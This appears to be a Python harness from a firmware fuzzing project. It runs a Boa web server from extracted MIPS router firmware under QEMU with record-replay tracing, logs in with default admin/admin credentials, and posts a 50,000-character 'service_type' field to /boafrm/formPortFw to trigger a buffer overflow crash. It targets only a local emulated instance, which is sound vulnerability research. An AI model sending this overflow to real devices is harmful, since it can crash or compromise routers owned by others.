
import os
import subprocess
import time
import shutil
import sys
import requests

# Configuration
QEMU_BUILD_PATH = "/home/webfuzz/Documents/qemu/build/qemu-mips"
ROOT_DIR = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/images/extracted_firmware/sim_root"
TRACE_FILE = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/traces/boa_login.trace"
BOA_CMD = ["bin/boa", "-c", ".", "-d"]

def setup_env():
    # Ensure trace directory exists
    os.makedirs(os.path.dirname(TRACE_FILE), exist_ok=True)
    if os.path.exists(TRACE_FILE):
        os.remove(TRACE_FILE)
    if os.path.exists(TRACE_FILE + ".bbl"):
        os.remove(TRACE_FILE + ".bbl")

def run_recording():
    print(f"[*] Starting Recording to {TRACE_FILE}...")
    
    # Environment variables for QEMU RR Recording
    env = os.environ.copy()
    env["RR_MODE"] = "record"
    env["RR_TRACE_FILE"] = TRACE_FILE
    env["QEMU_LD_PREFIX"] = "."
    
    # Run QEMU with boa
    cmd = [QEMU_BUILD_PATH] + ["-L", "."] + BOA_CMD
    
    print(f"[*] Executing: {' '.join(cmd)}")
    try:
        proc = subprocess.Popen(
            cmd,
            cwd=ROOT_DIR,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
    except Exception as e:
        print(f"[-] Failed to start process: {e}")
        return

    print(f"[*] Process started (PID={proc.pid}). Waiting for port 8080...")
    
    # Wait for service to be up
    for _ in range(10):
        try:
            requests.get("http://127.0.0.1:8080", timeout=1)
            print("[+] Service is UP.")
            break
        except:
            time.sleep(1)
    else:
        print("[-] Service failed to start. Checking logs...")
        return

    # Trigger Interaction with Login
    print("[*] Sending Login Request...")
    s = requests.Session()
    s.auth = ("admin", "admin")
    
    try:
        # 1. Login to establish session (if possible)
        r_login = s.get("http://127.0.0.1:8080/boafrm/formLogin")
        print(f"[*] Login Status: {r_login.status_code}")
        


        # 2. Trigger Exploit (The Overflow)
        # Even if redirected, the Body is sent and read by boa.
        # INCREASED PAYLOAD to 50000 to ensure crash/segfault
        payload = "a" * 50000
        data = {
            "addPortFw": "1",
            "formPortFw": "1",
            "service_type": payload,
            "sessionCheck": "" # Token if known
        }
        

        # Use session (cookie jar) for next request
        r_exploit = s.post("http://127.0.0.1:8080/boafrm/formPortFw", data=data)
        print(f"[*] Exploit Status: {r_exploit.status_code}")
        print(f"[*] Exploit Response Body Preview: {r_exploit.text[:500]}")
        
    except Exception as e:
        print(f"[-] Interaction error: {e}")


    # Wait a bit for processing
    time.sleep(2)
    
    if os.environ.get("NO_KILL", "0") == "1":
        print("[*] NO_KILL set. Keeping process alive for GDB/Crash verification...")
        try:
            while proc.poll() is None:
                time.sleep(1)
        except KeyboardInterrupt:
            print("[*] Manual stop.")
    else:
        print("[*] Stopping Process to flush trace...")
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except:
            proc.kill()
        
    print("[*] Recording Finished.")
    
    if os.path.exists(TRACE_FILE):
        size = os.path.getsize(TRACE_FILE)
        print(f"[+] Trace file created: {TRACE_FILE} ({size} bytes)")
    else:
        print("[-] Trace file NOT created.")

if __name__ == "__main__":
    setup_env()
    run_recording()
